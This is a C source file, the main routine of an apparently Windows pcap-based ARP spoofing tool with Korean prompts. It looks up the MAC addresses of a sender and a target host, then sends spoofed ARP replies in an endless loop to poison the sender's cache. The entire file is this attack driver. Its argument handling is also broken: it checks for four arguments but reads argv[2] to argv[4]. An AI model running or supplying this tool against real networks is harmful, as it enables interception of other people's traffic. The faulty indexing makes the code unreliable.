#include "stdafx.h"
#include "header.h"

// #define DEV

int main(int argc, char* argv[]) {
#ifdef DEV
	char adapter[]	= "rpcap://\\Device\\NPF_{960B29EE-E457-4712-8FE0-2FE256D232F6}";
	char cSenderIP[] = "192.168.43.217";
	char cTargetIP[] = "192.168.43.1";
#else
	if (argc != 4) {
		puts("인자가 올바르게 입력되지 않았습니다!");
		puts("아래와 같이 입력 후 다시 실행해주세요!");
		puts("send_arp.exe <interface명> <sender ip> <target ip>");
		puts("(ex) send_arp.exe rpcap://\Device\NPF_{960B29EE-E457-4712-8FE0-2FE256D232F6} 192.168.0.1 192.168.3.63\n");
		puts("[인터페이스 목록]");
		PcapAdapterListPrint();
		return -1;
	}
	char* adapter = argv[2];
	char* cSenderIP = argv[3];
	char* cTargetIP = argv[4];
#endif
	pcap_t* handle = PcapInit(adapter);

	uint8_t myIP[4], sendeIP[4], targetIP[4];
	GetIP(adapter, myIP);
	Char2UintIP(cSenderIP, sendeIP);
	Char2UintIP(cTargetIP, targetIP);
	printf("myIP: %d.%d.%d.%d\n", myIP[0], myIP[1], myIP[2], myIP[3]);

	uint8_t myMac[6], sendeMac[6], targetMac[6];
	GetMac(adapter, myMac);
	ArpGetMac(handle, myMac, myIP, sendeIP, sendeMac);
	ArpGetMac(handle, myMac, myIP, targetIP, targetMac);
	printf("myMac: %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n", myMac[0], myMac[1], myMac[2], myMac[3], myMac[4], myMac[5]);
	printf("sendeMac: %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n", sendeMac[0], sendeMac[1], sendeMac[2], sendeMac[3], sendeMac[4], sendeMac[5]);
	printf("targetMac: %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n", targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5]);

	puts("ARP spoofing공격을 시작하려면 아무키나 누르세요");
	system("pause > nul");

	while (true)
		ArpSpoofing(handle, myMac, targetIP, sendeMac, sendeIP);

	system("pause");
}